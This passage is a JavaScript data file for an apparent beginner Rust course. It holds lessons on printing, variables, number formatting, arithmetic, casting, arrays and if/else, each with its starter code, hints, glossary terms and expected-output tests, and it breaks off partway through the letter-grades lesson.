window.LEARN4FREE_COURSES = [{"id":"rust","title":"Rust Programming","language":"Rust","languageId":"rust","description":"Learn systems programming with safety and speed: from Hello World to ownership, traits and error handling.","units":[{"id":"getting-started","title":"Getting Started","lessons":[{"id":"hello-world","number":"1.1","title":"Hello, World!","content":"## What is a program?\n\nA **program** is a list of instructions for a computer, like a recipe is a list of instructions for a cook. The computer follows the instructions one after another, from top to bottom. You write a program as **code**: text written in a **programming language**. Our language is **Rust**.\n\nBefore a computer can follow your code, a tool called a **compiler** translates it into the numbers the computer really understands. This translating step is called to **compile**. When you press Run, Learn4Free compiles your code and then **runs** it, which means the computer carries out the instructions.\n\n## Your first program\n\nPrograms are built from **functions**. A **function** is a named group of instructions, like a recipe card with a title. Every Rust program must have a function named ^main^: the computer always starts there.\n\nInside ^main^ we use ^println!^ to **print**, which means to show text on the screen. The text we want to show is called a **string**: any text wrapped in double quotes ^\"like this\"^.\n\n~~~\nfn main() {\n    println!(\"Hello, Rust!\");\n}\n~~~\n\n- ^fn main() {^ - ^fn^ is short for \"function\". This line says \"here begins a function named main\". The empty parentheses ^()^ mean it needs no extra information. The curly brace ^{^ opens the function's body (its instructions).\n- ^println!(\"Hello, Rust!\");^ - this is a **statement**, one complete instruction. ^println!^ is a **macro**: a special built-in helper that writes code for you (you can spot one by the ^!^ after its name). It prints the string and then moves to a new line. The **semicolon** ^;^ marks the end of the statement, like a full stop ends a sentence.\n- ^}^ - the closing curly brace ends the function's body.\n\nOutput:\n\n~~~\nHello, Rust!\n~~~\n\nThe quote marks are not printed. They only tell Rust where the string starts and ends.\n\n## Try it\n\nChange the text between the quotes to your own name, then press Run. Then delete the semicolon and run again to see what an error message looks like. Put it back afterwards.\n\n## Your task\n\nMake the program print exactly this:\n\n~~~\nHello, World!\n~~~\n\nWrite one ^println!^ statement inside ^main^, replacing the comment. A **comment** is a note for humans that starts with ^//^ and is ignored by the computer.","starter":"fn main() {\n    // Print Hello, World! below\n\n}\n","hint":"Use println!(\"...\") with the text between double quotes.","terms":[{"term":"program","def":"A list of instructions that a computer follows from top to bottom."},{"term":"compiler","def":"A tool that translates your code into something the computer can run."},{"term":"function","def":"A named group of instructions; ^main^ is the one where every Rust program begins."},{"term":"println!","def":"A macro that prints text and then moves to a new line."},{"term":"macro","def":"A built-in helper whose name ends in ! and which writes code for you."},{"term":"string","def":"Text wrapped in double quotes, such as \"Hello\"."},{"term":"statement","def":"One complete instruction; in Rust most end with a semicolon."},{"term":"semicolon","def":"The ; symbol that ends a statement, like a full stop in a sentence."}],"image":{"url":"/diagrams/rust/hello-world.svg","caption":"Visual diagram: Hello, World!"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Hello, World!"}],"usesInput":false,"hasHarness":false},{"id":"multiple-lines","number":"1.2","title":"Printing Several Lines","content":"## println! vs print!\n\nComputers print text one piece at a time. ^println!^ prints text and then moves to a **new line**, like pressing Enter in a document. Its sibling ^print!^ prints text and stays on the same line, so the next thing printed continues right after it. Both are **macros** (built-in helpers whose names end in ^!^), and the text you give them is a **string** (text in double quotes).\n\n~~~\nfn main() {\n    print!(\"Hello, \");\n    println!(\"there!\");\n    println!(\"Bye!\");\n}\n~~~\n\n- ^print!(\"Hello, \");^ - prints ^Hello, ^ and stays on the same line. The **statement** (one complete instruction) ends with a semicolon.\n- ^println!(\"there!\");^ - continues on that same line with ^there!^, then moves to a new line.\n- ^println!(\"Bye!\");^ - prints ^Bye!^ on the new line.\n\nOutput:\n\n~~~\nHello, there!\nBye!\n~~~\n\nInside a string you can also write an **escape sequence**: a backslash ^\\^ followed by a letter that stands for a character you cannot easily type. ^\\n^ means \"new line\" and ^\\t^ means \"tab\" (a wide gap). For example ^println!(\"A\\nB\");^ prints A and B on two lines.\n\n## Try it\n\nChange ^println!(\"there!\");^ to ^print!(\"there!\");^ and run it. What happens to ^Bye!^? Then try putting ^\\n^ inside one of the strings.\n\n## Your task\n\nPrint this poem, with one ^println!^ for each line:\n\n~~~\nRoses are red,\nViolets are blue,\nRust is fun,\nAnd so are you!\n~~~\n\nThat is four ^println!^ statements, in the same order as the poem.","starter":"fn main() {\n\n}\n","hint":"Four println! calls, each ending with a semicolon.","terms":[{"term":"print!","def":"A macro that prints text and stays on the same line."},{"term":"println!","def":"A macro that prints text and then moves to a new line."},{"term":"new line","def":"The point where text continues on the next line, like pressing Enter."},{"term":"escape sequence","def":"A backslash plus a letter inside a string that stands for a special character."},{"term":"\\n","def":"The escape sequence for a new line."},{"term":"\\t","def":"The escape sequence for a tab (a wide gap)."}],"image":{"url":"/diagrams/rust/multiple-lines.svg","caption":"Visual diagram: Printing Several Lines"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Roses are red,\nViolets are blue,\nRust is fun,\nAnd so are you!"}],"usesInput":false,"hasHarness":false},{"id":"placeholders","number":"1.3","title":"Placeholders","content":"## Variables and placeholders\n\nA **variable** is a labeled box that stores a value. You make one with the keyword ^let^. A **keyword** is a word that has a special meaning in Rust. The **value** is the thing inside the box, such as the string ^\"Rust\"^ or the number ^7^.\n\nTo put a variable's value inside printed text, use a **placeholder**: a pair of curly braces ^{}^ in the string that acts like a blank in a form. Rust fills each blank with a value you list after the string, in order. Text with placeholders is called a **format string**.\n\n~~~\nfn main() {\n    let language = \"Rust\";\n    let year = 2015;\n    println!(\"I love {}!\", language);\n    println!(\"{} appeared in {}.\", language, year);\n    println!(\"I love {language}!\");\n}\n~~~\n\n- ^let language = \"Rust\";^ - makes a box labeled ^language^ and puts the string ^\"Rust\"^ in it. The ^=^ sign means \"store this value\".\n- ^let year = 2015;^ - makes a box labeled ^year^ holding the number ^2015^. Numbers have no quotes.\n- ^println!(\"I love {}!\", language);^ - the ^{}^ blank is filled with the value of ^language^. The value comes after a comma.\n- ^println!(\"{} appeared in {}.\", language, year);^ - two blanks, filled in order: first ^language^, then ^year^.\n- ^println!(\"I love {language}!\");^ - a shortcut: you can write the variable's name inside the braces.\n\nOutput:\n\n~~~\nI love Rust!\nRust appeared in 2015.\nI love Rust!\n~~~\n\n## Try it\n\nChange the value of ^language^ to ^\"Ferris\"^ and run it. All the lines that use the variable change at once. That is the benefit of variables.\n\n## Your task\n\nThe variables ^name^ and ^age^ are already made for you. Use one ^println!^ with two ^{}^ placeholders to print exactly:\n\n~~~\nFerris is 7 years old.\n~~~\n\nDo not type the name or the age directly inside the string. Let the placeholders fill them in.","starter":"fn main() {\n    let name = \"Ferris\";\n    let age = 7;\n\n}\n","hint":"println!(\"{} is {} years old.\", name, age);","terms":[{"term":"variable","def":"A labeled box that stores a value."},{"term":"let","def":"The keyword that creates a new variable."},{"term":"keyword","def":"A word with a special built-in meaning in Rust."},{"term":"value","def":"A piece of data, such as a number or a string."},{"term":"{}","def":"A placeholder: a blank in a format string that gets filled with a value."},{"term":"format string","def":"A string containing placeholders, used by println! and print!."},{"term":"=","def":"In a let statement, stores the value on the right into the variable on the left."}],"image":{"url":"/diagrams/rust/placeholders.svg","caption":"Visual diagram: Placeholders"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Ferris is 7 years old."}],"usesInput":false,"hasHarness":false},{"id":"format-numbers","number":"1.4","title":"Formatting Numbers","content":"## Controlling how values look\n\nRust has two main kinds of numbers. An **integer** is a whole number like ^42^. A **float** (floating-point number) has a decimal point, like ^3.14159^. Floats often have many digits, and you may want to show fewer.\n\nInside a placeholder you can add a colon ^:^ and a **format specifier**: a short code that says how to display the value. Some examples:\n\n- ^{:.2}^ - show exactly 2 digits after the decimal point (rounded)\n- ^{:5}^ - pad with spaces to a width of 5 characters\n- ^{:>5}^ and ^{:<5}^ - right-align and left-align inside that width\n- ^{:05}^ - pad with zeros to width 5\n- ^{:?}^ - **debug format**, a plain display meant for programmers\n\n~~~\nfn main() {\n    let pi = 3.14159;\n    let n = 42;\n    println!(\"{:.1}\", pi);\n    println!(\"{:.3}\", pi);\n    println!(\"{:05}\", n);\n}\n~~~\n\n- ^let pi = 3.14159;^ - a variable holding a float.\n- ^let n = 42;^ - a variable holding an integer.\n- ^println!(\"{:.1}\", pi);^ - prints ^pi^ with one digit after the point.\n- ^println!(\"{:.3}\", pi);^ - prints it with three digits.\n- ^println!(\"{:05}\", n);^ - prints ^n^ padded with zeros to 5 characters.\n\nOutput:\n\n~~~\n3.1\n3.142\n00042\n~~~\n\nNotice ^3.14159^ became ^3.142^: Rust rounds, it doesn't just cut digits off.\n\nMath in Rust uses ^*^ for multiply, ^+^ for add, ^-^ for subtract and ^/^ for divide. A calculation like ^3.14 * 2.0^ is called an **expression**: something Rust works out into a single value.\n\n## Try it\n\nChange ^{:.3}^ to ^{:.0}^ and run it. Then try ^{:8}^ with ^n^ and count the spaces.\n\n## Your task\n\nThe program already computes the area of a circle (pi times radius times radius) and stores it in the variable ^area^. Print it with exactly two digits after the decimal point, like this:\n\n~~~\nArea: 78.54\n~~~\n\nUse the ^{:.2}^ format specifier in your ^println!^.","starter":"fn main() {\n    let radius = 5.0;\n    let area = 3.14159265 * radius * radius;\n\n}\n","hint":"println!(\"Area: {:.2}\", area);","terms":[{"term":"integer","def":"A whole number with no decimal point, like 42."},{"term":"float","def":"A number with a decimal point, like 3.14."},{"term":"format specifier","def":"A code after a colon inside {} that controls how a value is shown."},{"term":"{:.2}","def":"Shows a number with exactly 2 digits after the decimal point."},{"term":"{:05}","def":"Pads a number with leading zeros to a width of 5."},{"term":"expression","def":"A piece of code, like 3.0 * 2.0, that Rust works out into one value."},{"term":"*","def":"The multiplication operator."}],"image":{"url":"/diagrams/rust/format-numbers.svg","caption":"Visual diagram: Formatting Numbers"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"Area: 78.54"}],"usesInput":false,"hasHarness":false}]},{"id":"variables-types","title":"Variables & Types","lessons":[{"id":"let-bindings","number":"2.1","title":"Variables with let","content":"## A variable is a labeled box\n\nA **variable** is a labeled box that stores a value so you can use it later. The label is the variable's **name**, and what is inside the box is its **value**. In Rust you make a variable with the word ^let^. A **keyword** is a word that Rust reserves for itself and gives a special meaning; ^let^ is a keyword that means \"create a new variable\".\n\nEvery value also has a **type**, which says what kind of thing it is (a whole number, a decimal number, text, and so on). Rust usually works out the type by itself; this is called **type inference**. You can also write the type yourself after a colon. The type ^i32^ means \"a whole number (an **integer**) that fits in 32 bits of computer memory\", and ^i64^ is the same idea with a bigger box.\n\nAn **expression** is a piece of code that produces a value, like ^12 + 30^. In ^println!^ (which prints text on the screen), the symbols ^{}^ are a **placeholder**: a gap that Rust fills in with the value you list after the text.\n\nExample:\n\n~~~\nfn main() {\n    let x = 5;\n    let y: i64 = 10;\n    println!(\"{}\", x + y);\n}\n~~~\n\n- ^fn main() {^ starts the **function** (a named, reusable block of code) called ^main^, where your program begins.\n- ^let x = 5;^ creates a variable named ^x^ and puts 5 in it. Rust infers that it is an ^i32^. The ^=^ sign here means \"store this value\", not \"is equal to\".\n- ^let y: i64 = 10;^ creates ^y^ and explicitly says its type is ^i64^.\n- ^println!(\"{}\", x + y);^ works out ^x + y^ (that is 15) and puts it where the ^{}^ is. The ^;^ (**semicolon**) ends the statement.\n- ^}^ closes the function.\n\nOutput:\n\n~~~\n15\n~~~\n\nBy default a variable is **immutable**, which means that once you give it a value you cannot change it. That is a safety feature: nothing can silently change a value behind your back.\n\n## Try it\n\nChange ^let x = 5;^ to ^let x = 100;^ and run again. The output should become ^110^.\n\n## Your task\n\nDeclare two variables, ^a^ with the value 12 and ^b^ with the value 30, using ^let^. Then print their sum on one line.\n\nExpected output:\n\n~~~\n42\n~~~","starter":"fn main() {\n\n}\n","hint":"let a = 12; let b = 30; println!(\"{}\", a + b);","terms":[{"term":"variable","def":"A named box in memory that stores a value."},{"term":"let","def":"The keyword that creates a new variable."},{"term":"type","def":"The kind of value something is, such as a whole number or text."},{"term":"i32 / i64","def":"Whole-number types that use 32 or 64 bits of memory."},{"term":"immutable","def":"Unchangeable: after being set, the value cannot be changed."},{"term":"{}","def":"A placeholder inside println! that is replaced by a value."}],"image":{"url":"/diagrams/rust/let-bindings.svg","caption":"Visual diagram: Variables with let"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"42"}],"usesInput":false,"hasHarness":false},{"id":"mutability","number":"2.2","title":"Mutable Variables","content":"## Letting a variable change\n\nVariables made with ^let^ are **immutable** (unchangeable). If you want one to change, you mark it as **mutable** (changeable) by adding the keyword ^mut^ (short for \"mutable\"). Think of a whiteboard versus a printed page: ^let mut^ gives you the whiteboard.\n\nChanging a variable's value is called **assignment**. Writing ^score = score + 10;^ means \"work out score plus 10, then store the result back in score\". The shorthand ^+=^ means \"add to the variable itself\", so ^score += 5;^ is the same as ^score = score + 5;^.\n\nIf you try to change a variable that is not ^mut^, Rust refuses to **compile** your program. To **compile** means to translate your code into instructions the computer can run; a **compile error** is Rust telling you it cannot do that because something is wrong.\n\nExample:\n\n~~~\nfn main() {\n    let mut score = 0;\n    score = score + 10;\n    score += 5;\n    println!(\"{}\", score);\n}\n~~~\n\n- ^let mut score = 0;^ makes a changeable variable ^score^ that starts at 0.\n- ^score = score + 10;^ stores 0 + 10 in ^score^, so it is now 10.\n- ^score += 5;^ adds 5 to it, so it is now 15.\n- ^println!(\"{}\", score);^ prints the current value.\n\nOutput:\n\n~~~\n15\n~~~\n\n## Try it\n\nDelete the word ^mut^ and run it. Read the compile error Rust gives you; it tells you that you cannot assign twice to an immutable variable. Put ^mut^ back afterwards.\n\n## Your task\n\nThe starter has ^counter^ starting at 0. Make it mutable, then add 1 to it three times (one line per addition), and print it.\n\nExpected output:\n\n~~~\n3\n~~~","starter":"fn main() {\n    let counter = 0;\n\n    println!(\"{}\", counter);\n}\n","hint":"Change to let mut counter = 0; then use counter += 1; three times.","terms":[{"term":"mut","def":"Keyword that makes a variable mutable (changeable)."},{"term":"mutable","def":"Able to be changed after it is first set."},{"term":"assignment","def":"Storing a new value in an existing variable using =."},{"term":"+=","def":"Shorthand that adds a value to a variable and stores the result back in it."},{"term":"compile","def":"To translate your code into instructions the computer can run."},{"term":"compile error","def":"A message from Rust saying the code is not allowed and cannot be built."}],"image":{"url":"/diagrams/rust/mutability.svg","caption":"Visual diagram: Mutable Variables"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"3"}],"usesInput":false,"hasHarness":false},{"id":"shadowing","number":"2.3","title":"Shadowing","content":"## Reusing a name\n\nYou can write ^let^ again with a name you have already used. This creates a brand-new variable that **shadows** (hides) the old one: from then on, the name refers to the new box, like putting a new label over an old one. This is called **shadowing**.\n\nUnlike ^mut^, shadowing makes a whole new variable, so it can even have a different type.\n\nA piece of text in double quotes, like ^\"hello\"^, is called a **string**. A **method** is an action attached to a value, which you call by writing a dot and then its name, like ^text.len()^. The ^len^ method returns the **length**: how many characters (letters, spaces, symbols) the string has.\n\nExample:\n\n~~~\nfn main() {\n    let spaces = \"   \";\n    let spaces = spaces.len();\n    println!(\"{}\", spaces);\n}\n~~~\n\n- ^let spaces = \"   \";^ makes a string containing three spaces.\n- ^let spaces = spaces.len();^ asks the old ^spaces^ for its length (3) and makes a new ^spaces^ holding that number. The old string is now hidden.\n- ^println!(\"{}\", spaces);^ prints the new ^spaces^.\n\nOutput:\n\n~~~\n3\n~~~\n\n## Try it\n\nChange the three spaces to five spaces and run again. The output should be ^5^.\n\n## Your task\n\nThe starter has ^text^ set to the string ^\"hello world\"^. Shadow ^text^ with a second ^let^ so it becomes the length of the string, then print it.\n\nExpected output:\n\n~~~\n11\n~~~","starter":"fn main() {\n    let text = \"hello world\";\n\n    println!(\"{}\", text);\n}\n","hint":"let text = text.len();","terms":[{"term":"shadowing","def":"Declaring a new variable with an existing name, hiding the old one."},{"term":"string","def":"A piece of text written in double quotes."},{"term":"method","def":"An action attached to a value, called with a dot, like text.len()."},{"term":"len()","def":"Method that gives the number of characters in a string."},{"term":".","def":"The dot that calls a method on a value."}],"image":{"url":"/diagrams/rust/shadowing.svg","caption":"Visual diagram: Shadowing"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"11"}],"usesInput":false,"hasHarness":false},{"id":"integer-math","number":"2.4","title":"Integer Arithmetic","content":"## Doing math with whole numbers\n\nAn **operator** is a symbol that does something to values. The math operators are ^+^ (add), ^-^ (subtract), ^*^ (multiply), ^/^ (divide), and ^%^ (remainder). With integers, ^/^ throws away the fraction: ^7 / 2^ is ^3^, not 3.5. The **remainder** operator ^%^ gives what is left over: ^7 % 2^ is ^1^ (two goes into seven three times, with one left over).\n\n## Reading input\n\n**Standard input** (stdin) is the text a user types into your program. The starter code already reads one line of it into a variable. ^parse^ converts text into a number. Reading numbers works in these steps: ^split_whitespace^ cuts the line into words at the spaces; ^map^ does something to each word; ^collect^ gathers the results into a **vector** (^Vec^), which is a growing list of values of the same type. ^unwrap^ means \"give me the result, and crash if something went wrong\". The ^|s| ...^ part is a **closure**, a tiny nameless function.\n\nYou get items out of a list by **index**, their position counting from 0, so ^nums[0]^ is the first. ^let (a, b) = (nums[0], nums[1]);^ is a **tuple**: a group of values in parentheses; here it creates two variables at once.\n\nExample (input is ^7 2^):\n\n~~~\nlet nums: Vec<i32> = line.split_whitespace().map(|s| s.parse().unwrap()).collect();\nlet (a, b) = (nums[0], nums[1]);\nprintln!(\"{}\", a / b);\nprintln!(\"{}\", a % b);\n~~~\n\n- The first line turns the text ^\"7 2\"^ into the list ^[7, 2]^.\n- The second line names the first number ^a^ and the second ^b^.\n- ^a / b^ is 7 / 2, which is 3 with the fraction dropped.\n- ^a % b^ is the remainder, 1.\n\nOutput:\n\n~~~\n3\n1\n~~~\n\n## Try it\n\nIn the editor, add ^println!(\"{}\", a + b + 1);^ and run it with the input ^7 2^. You should see ^10^.\n\n## Your task\n\nThe input is two integers ^a b^ on one line (b is never 0). The starter already reads them. Print four lines: the sum, the difference (a - b), the product, and then the quotient and remainder written like ^3 r 1^ (use ^println!(\"{} r {}\", a / b, a % b);^).\n\nFor input ^7 2^ the expected output is:\n\n~~~\n9\n5\n14\n3 r 1\n~~~","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let nums: Vec<i32> = line.split_whitespace().map(|s| s.parse().unwrap()).collect();\n    let (a, b) = (nums[0], nums[1]);\n\n}\n","hint":"Four println! lines. The last: println!(\"{} r {}\", a / b, a % b);","terms":[{"term":"operator","def":"A symbol such as + or * that does an operation on values."},{"term":"/","def":"Division; with integers it drops the fraction."},{"term":"%","def":"Remainder operator: what is left after dividing."},{"term":"stdin","def":"Standard input: text typed in or given to your program."},{"term":"parse","def":"Converts text into another type, such as a number."},{"term":"Vec","def":"A vector: a list of values of one type that can grow."},{"term":"index","def":"The position of an item in a list, starting at 0."},{"term":"tuple","def":"A group of values in parentheses, like (a, b)."}],"image":{"url":"/diagrams/rust/integer-math.svg","caption":"Visual diagram: Integer Arithmetic"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"seven and two","input":"7 2\n","expected":"9\n5\n14\n3 r 1"},{"name":"exact division","input":"20 5\n","expected":"25\n15\n100\n4 r 0"},{"name":"smaller divided by larger","input":"3 10\n","expected":"13\n-7\n30\n0 r 3"},{"name":"negative first number","input":"-7 2\n","expected":"-5\n-9\n-14\n-3 r -1"},{"name":"zero first number","input":"0 5\n","expected":"5\n-5\n0\n0 r 0"},{"name":"larger numbers","input":"100000 3\n","expected":"100003\n99997\n300000\n33333 r 1"}],"usesInput":true,"hasHarness":false},{"id":"floats-casting","number":"2.5","title":"Floats & Casting","content":"## Decimal numbers\n\nA number with a decimal point, like ^3.5^, is a **float** (short for floating-point number). Rust's float types are ^f64^ (precise, the usual choice) and ^f32^ (smaller). Integers and floats are different types, and Rust will not mix them automatically. To convert a value from one type to another, you use **casting** with the keyword ^as^. For example ^n as f64^ turns the integer ^n^ into a float.\n\nBecause integer division drops the fraction, write ^9.0 / 5.0^ instead of ^9 / 5^ when you want the exact answer 1.8.\n\nTo control how a float is printed, change the placeholder: ^{:.1}^ means \"show exactly 1 digit after the decimal point\".\n\nExample:\n\n~~~\nfn main() {\n    let n: i32 = 7;\n    let half = n as f64 / 2.0;\n    println!(\"{}\", half);\n    println!(\"{:.2}\", half);\n}\n~~~\n\n- ^let n: i32 = 7;^ is a whole number.\n- ^n as f64^ casts it to a float (7.0), then ^/ 2.0^ divides it, giving 3.5.\n- The first ^println!^ prints the float as it is.\n- ^{:.2}^ prints it with two decimal places.\n\nOutput:\n\n~~~\n3.5\n3.50\n~~~\n\n## Try it\n\nChange ^2.0^ to ^3.0^ and run it. You will see ^2.33333...^ and then ^2.33^ (the first line has many digits).\n\n## Your task\n\nRead a temperature in Celsius (a float) from the input, as the starter does, and print the Fahrenheit value with one decimal place, using F = C * 9/5 + 32. Write the numbers as floats (^9.0^, ^5.0^, ^32.0^).\n\nFor input ^100^ the expected output is:\n\n~~~\n212.0\n~~~","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let c: f64 = line.trim().parse().unwrap();\n\n}\n","hint":"Use 9.0 / 5.0 (floats!) and print with {:.1}.","terms":[{"term":"float","def":"A number with a decimal point, such as 3.5."},{"term":"f64","def":"A 64-bit float type; the usual choice for decimals."},{"term":"as","def":"Keyword that converts (casts) a value to another type."},{"term":"casting","def":"Converting a value from one type to another."},{"term":"{:.1}","def":"A placeholder that prints a float with 1 digit after the decimal point."},{"term":"trim()","def":"Method that removes spaces and the newline at the ends of a string."}],"image":{"url":"/diagrams/rust/floats-casting.svg","caption":"Visual diagram: Floats & Casting"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"boiling point","input":"100\n","expected":"212.0"},{"name":"freezing point","input":"0\n","expected":"32.0"},{"name":"body temperature","input":"37\n","expected":"98.6"},{"name":"negative forty","input":"-40\n","expected":"-40.0"},{"name":"decimal input","input":"36.6\n","expected":"97.9"},{"name":"large value","input":"1000\n","expected":"1832.0"}],"usesInput":true,"hasHarness":false},{"id":"tuples-arrays","number":"2.6","title":"Tuples & Arrays","content":"## Grouping values\n\nSometimes you want one variable to hold several values. Rust has two basic ways. A **tuple** groups a fixed number of values that may be of different types, written in parentheses. An **array** holds a fixed number of values that are all the same type, written in square brackets. Picture a tuple as a bag of mixed items and an array as an egg carton: every slot holds the same kind of thing.\n\nEach value inside is an **element**. You reach an element by its **index**, its position counted from 0 (the first element is at index 0, not 1). For arrays write ^a[0]^; for tuples write ^t.0^. The method ^len()^ tells you how many elements an array has, so the last element is at index ^a.len() - 1^.\n\nExample:\n\n~~~\nfn main() {\n    let t = (1, \"two\", 3.0);\n    println!(\"{}\", t.1);\n\n    let a = [3, 1, 4];\n    println!(\"{} {}\", a[0], a.len());\n}\n~~~\n\n- ^let t = (1, \"two\", 3.0);^ makes a tuple holding an integer, a string, and a float.\n- ^t.1^ is the element at index 1, the string ^two^.\n- ^let a = [3, 1, 4];^ makes an array of three integers.\n- ^a[0]^ is the first element (3) and ^a.len()^ is the count (3).\n\nOutput:\n\n~~~\ntwo\n3 3\n~~~\n\n## Try it\n\nChange ^a[0]^ to ^a[2]^ and run it. The output's second line becomes ^4 3^.\n\n## Your task\n\nThe starter has an array ^nums^ with 8 numbers. Print one line in exactly this form, getting the values from the array with indexing and ^len()^ (do not type them in by hand):\n\n~~~\nfirst=3 last=6 len=8\n~~~","starter":"fn main() {\n    let nums = [3, 1, 4, 1, 5, 9, 2, 6];\n\n}\n","hint":"nums[0], nums[nums.len() - 1], nums.len()","terms":[{"term":"tuple","def":"A fixed-size group of values that can have different types."},{"term":"array","def":"A fixed-size list of values that all have the same type."},{"term":"element","def":"One value stored inside a tuple or array."},{"term":"index","def":"An element's position, starting from 0."},{"term":"[ ]","def":"Square brackets: they write an array or pick an element by index."},{"term":"len()","def":"Method that returns how many elements an array has."}],"image":{"url":"/diagrams/rust/tuples-arrays.svg","caption":"Visual diagram: Tuples & Arrays"},"isUnitTest":true,"fileName":"main.rs","tests":[{"name":"Test 1","input":"","expected":"first=3 last=6 len=8"}],"usesInput":false,"hasHarness":false}]},{"id":"control-flow","title":"Control Flow","lessons":[{"id":"if-else","number":"3.1","title":"if and else","content":"## Programs that make decisions\n\nSo far your programs ran every line from top to bottom. **Control flow** means choosing which lines run, or running some lines again. Think of a fork in a road: you look at a sign and pick a path.\n\nAn **if** statement is that fork. It asks a question, called a **condition**. A condition is a question whose answer is only ever **true** or **false**. A value that is true or false has the type **bool** (short for **boolean**, named after the mathematician George Boole). If the answer is true, Rust runs the code in the first **block**. A block is a group of lines wrapped in curly braces ^{ }^. If the answer is false, Rust skips that block and runs the **else** block instead, if there is one.\n\nTo build conditions we use **comparison operators**. An **operator** is a symbol that does something with values. These ones compare two values and give back true or false: ^==^ (equal to), ^!=^ (not equal), ^<^ (less than), ^>^ (greater than), ^<=^ (less than or equal), ^>=^ (greater than or equal). Careful: one ^=^ stores a value in a variable, two ^==^ asks if two things are equal.\n\n~~~\nfn main() {\n    let x = 7;\n    if x > 0 {\n        println!(\"positive\");\n    } else {\n        println!(\"not positive\");\n    }\n}\n~~~\n\n- ^let x = 7;^ makes a variable named x holding the number 7.\n- ^if x > 0 {^ asks the condition \"is x greater than 0?\" The answer is true. No parentheses are needed around the condition, and it must be a bool (Rust never treats a number as true or false).\n- ^println!(\"positive\");^ is inside the first block, so it runs because the condition was true.\n- ^} else {^ starts the block that runs when the condition is false. It is skipped here.\n- ^println!(\"not positive\");^ would print if x were 0 or negative.\n- The last two ^}^ close the else block and the function.\n\nOutput:\n\n~~~\npositive\n~~~\n\nYou can chain questions with **else if**: Rust checks conditions from top to bottom and runs only the first block whose condition is true. You can also combine conditions: ^&&^ means \"and\" (both must be true), ^||^ means \"or\" (at least one true), ^!^ means \"not\" (flips true and false).\n\n## Try it\n\nChange ^let x = 7;^ to ^let x = -2;^ and run it. Which line prints now? Then try ^0^.\n\n## Your task\n\nThe starter code already reads a whole number from the user into a variable called ^n^. Using ^if^, ^else if^ and ^else^, print exactly one word:\n\n- ^positive^ if n is greater than 0\n- ^negative^ if n is less than 0\n- ^zero^ otherwise\n\nFor example, input ^5^ prints:\n\n~~~\npositive\n~~~","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let n: i32 = line.trim().parse().unwrap();\n\n}\n","hint":"Use if n > 0 { } else if n < 0 { } else { }","terms":[{"term":"control flow","def":"Deciding which lines of a program run, and how many times."},{"term":"condition","def":"A question that is answered with true or false."},{"term":"bool","def":"The type of a value that is either true or false."},{"term":"block","def":"A group of lines wrapped in curly braces { }."},{"term":"if / else / else if","def":"Keywords that run a block only when a condition is true (else: when it is not; else if: another question to try)."},{"term":"== != < > <= >=","def":"Comparison operators that check two values and give true or false."},{"term":"&& || !","def":"And, or, and not: they combine or flip conditions."}],"image":{"url":"/diagrams/rust/if-else.svg","caption":"Visual diagram: if and else"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"positive number","input":"5\n","expected":"positive"},{"name":"negative number","input":"-3\n","expected":"negative"},{"name":"zero","input":"0\n","expected":"zero"},{"name":"smallest positive","input":"1\n","expected":"positive"},{"name":"smallest negative","input":"-1\n","expected":"negative"},{"name":"large positive","input":"2000000000\n","expected":"positive"},{"name":"large negative","input":"-2000000000\n","expected":"negative"}],"usesInput":true,"hasHarness":false},{"id":"letter-grades","number":"3.2","title":"Letter Grades","content":"## if produces a value\n\nIn Rust, ^if^ is an **expression**. An expression is a piece of code that works out to a value, like ^2 + 3^ works out to 5. Because ^if^ is an expression, you can store its result in a variable. Each **branch** (one possible path, such as the if part or the else part) gives back a value.\n\n~~~\nfn main() {\n    let n = 150;\n    let size = if n > 100 { \"big\" } else { \"small\" };\n    println!(\"{}\", size);\n}\n~~~\n\n- ^let n = 150;^ stores 150 in n.\n- ^let size = if n > 100 { \"big\" } else { \"small\" };^ checks if n is over 100. It is, so the whole if expression becomes the text \"big\", which is stored in size.\n- Notice there is no semicolon after ^\"big\"^ inside the braces. The last line of a block with no semicolon is the value the block hands back. Adding a semicolon would throw the value away.\n- Both branches must give the same type (here, both are text), and an else is required, because there must always be a value.\n- ^println!(\"{}\", size);^ prints the stored text; ^{}^ is the placeholder filled by size.\n\nOutput:\n\n~~~\nbig\n~~~\n\nA **threshold** is a cut-off value where behaviour changes (like 90 for an A). When you chain ^else if^ branches, always list them from the highest threshold down, because the first true condition wins.\n\n## Try it\n\nChange ^let n = 150;^ to ^let n = 100;^. Does it print big or small? Why? (Hint: is 100 greater than 100?) Try changing ^>^ to ^>=^.\n\n## Your task\n\nThe starter reads a score into ^n^. Store a letter in a variable called ^grade^ using an ^if^ expression, then print it:\n\n- ^A^ for 90 or more\n- ^B^ for 80 to 89\n- ^C^ for 70 to 79\n- ^D^ for 60 to 69\n- ^F^ for anything lower\n\nFor example, input ^85^ prints:\n\n~~~\nB\n~~~","starter":"use std::io;\n\nfn main() {\n    let mut line = String::new();\n    io::stdin().read_line(&mut line).unwrap();\n    let n: i32 = line.trim().parse().unwrap();\n\n}\n","hint":"Chain else if from the highest threshold downward.","terms":[{"term":"expression","def":"Code that works out to a single value."},{"term":"branch","def":"One of the possible paths of an if (the if part, an else if part, or the else part)."},{"term":"threshold","def":"A cut-off number where the result changes."},{"term":"let","def":"The keyword that creates a variable."},{"term":"no semicolon","def":"A last line without ; in a block is the value the block gives back."},{"term":"{}","def":"In println!, a placeholder that is replaced by a value."}],"image":{"url":"/diagrams/rust/letter-grades.svg","caption":"Visual diagram: Letter Grades"},"isUnitTest":false,"fileName":"main.rs","tests":[{"name":"score 